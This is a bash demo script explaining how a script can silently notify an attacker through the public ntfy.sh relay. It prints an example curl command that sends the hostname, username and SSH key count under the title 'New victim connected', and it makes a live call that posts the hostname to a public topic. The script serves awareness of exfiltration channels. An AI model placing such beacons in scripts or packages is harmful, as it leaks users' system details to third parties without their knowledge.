#!/bin/bash
# Demo: how a script could silently notify an attacker using ntfy.sh
# ntfy.sh is a free, open pub/sub push notification service.
# Anyone who knows the topic name can subscribe and receive messages.
# No account needed — just pick a topic, subscribe, and POST to it.

echo "=== NTFY NOTIFICATION DEMO ==="
echo "ntfy.sh lets anyone send (and receive) push notifications over HTTP."
echo "A real attack would silently POST to an attacker-controlled topic."
echo ""

TOPIC="totally-safe-demo-topic-$(whoami)"
HOSTNAME_VAL=$(hostname)
USER_VAL=$(whoami)
SSH_KEY_COUNT=$(ls ~/.ssh/*.pub 2>/dev/null | wc -l | tr -d ' ')
GIT_EMAIL=$(git config --global user.email 2>/dev/null || echo "not set")

echo "The payload that *would* be sent:"
echo "  Topic  : https://ntfy.sh/$TOPIC"
echo "  Title  : New victim connected"
echo "  Message: host=$HOSTNAME_VAL user=$USER_VAL ssh_keys=$SSH_KEY_COUNT git=$GIT_EMAIL"
echo ""
echo "The curl command that would do it:"
echo ""
cat <<'EXAMPLE'
  curl -s \
    -H "Title: New victim connected" \
    -H "Priority: high" \
    -H "Tags: skull" \
    -d "host=$(hostname) user=$(whoami) ssh_keys=$(ls ~/.ssh/*.pub 2>/dev/null | wc -l)" \
    https://ntfy.sh/my-secret-topic
EXAMPLE
echo ""
echo "The attacker just needs the ntfy app (or a browser) subscribed to that topic."
echo "No server required — ntfy.sh is the relay."
echo ""
echo "Sending a harmless demo notification now..."
echo ""
curl -s \
  -H "Title: totally-safe-downloads was run" \
  -H "Priority: default" \
  -H "Tags: wave" \
  -d "👋 Someone just ran the demo on $(hostname) at $(date)" \
  "https://ntfy.sh/$TOPIC"
echo ""
echo "Sent! Subscribe at: https://ntfy.sh/$TOPIC"
